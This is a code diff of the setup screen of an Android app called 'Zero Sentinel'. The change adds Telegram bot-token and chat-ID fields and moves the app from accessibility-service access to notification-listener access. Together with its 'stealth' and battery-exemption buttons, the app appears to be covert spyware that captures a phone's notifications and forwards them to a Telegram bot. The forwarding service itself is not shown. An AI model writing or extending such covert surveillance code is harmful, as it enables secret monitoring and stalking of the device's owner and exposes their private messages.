@@ -7,6 +7,7 @@ import android.os.Bundle
 import android.provider.Settings
 import android.view.accessibility.AccessibilityManager
 import android.widget.Button
+import android.widget.EditText
 import android.widget.TextView
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
@@ -25,6 +26,9 @@ class MainActivity : AppCompatActivity() {
     private lateinit var enableButton: Button
     private lateinit var batteryButton: Button
     private lateinit var stealthButton: Button
+    private lateinit var botTokenInput: EditText
+    private lateinit var chatIdInput: EditText
+    private lateinit var saveButton: Button
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -32,15 +36,43 @@ class MainActivity : AppCompatActivity() {
 
         statusText = findViewById(R.id.tv_status)
         enableButton = findViewById(R.id.btn_enable_accessibility)
+        enableButton.text = "1. Enable Notification Access"
+        
         batteryButton = findViewById(R.id.btn_ignore_battery)
         stealthButton = findViewById(R.id.btn_enable_stealth)
+        botTokenInput = findViewById(R.id.et_bot_token)
+        chatIdInput = findViewById(R.id.et_chat_id)
+        saveButton = findViewById(R.id.btn_save_connection)
 
-        // 1. Accessibility
+        val prefsManager = com.zero.sentinel.data.EncryptedPrefsManager(this)
+
+        // Load existing
+        botTokenInput.setText(prefsManager.getBotToken())
+        chatIdInput.setText(prefsManager.getChatId())
+
+        // Save Connection
+        saveButton.setOnClickListener {
+            val token = botTokenInput.text.toString()
+            val chat = chatIdInput.text.toString()
+            
+            if (token.isNotEmpty() && chat.isNotEmpty()) {
+                prefsManager.saveBotToken(token)
+                prefsManager.saveChatId(chat)
+                Toast.makeText(this, "Credentials Saved!", Toast.LENGTH_SHORT).show()
+                // Restart Service to pick up new creds
+                startService(Intent(this, com.zero.sentinel.services.SentinelService::class.java))
+            } else {
+                Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
+            }
+        }
+
+        // 1. Notification Access
         enableButton.setOnClickListener {
-            if (!isAccessibilityServiceEnabled()) {
-                val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            if (!isNotificationServiceEnabled()) {
+                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                 intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                 startActivity(intent)
+                
                 Toast.makeText(this, "Find 'Zero Sentinel' and enable it.", Toast.LENGTH_LONG).show()
             }
         }
@@ -65,10 +97,10 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun updateStatus() {
-        // Check Accessibility
-        if (isAccessibilityServiceEnabled()) {
+        // Check Notification Access
+        if (isNotificationServiceEnabled()) {
             enableButton.isEnabled = false
-            enableButton.text = "Service Enabled ✅"
+            enableButton.text = "Access Granted ✅"
         } else {
             enableButton.isEnabled = true
         }
@@ -84,15 +116,10 @@ class MainActivity : AppCompatActivity() {
         statusText.text = "Setup Status: ${if (enableButton.isEnabled) "Incomplete" else "Ready"}"
     }
 
-    private fun isAccessibilityServiceEnabled(): Boolean {
-        val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
-        val enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
-        for (service in enabledServices) {
-            if (service.id.contains(packageName) && service.id.contains(SentinelAccessibilityService::class.java.simpleName)) {
-                return true
-            }
-        }
-        return false
+    private fun isNotificationServiceEnabled(): Boolean {
+        val packageName = packageName
+        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
+        return flat?.contains(packageName) == true
     }
 
     private fun isIgnoringBatteryOptimizations(): Boolean {
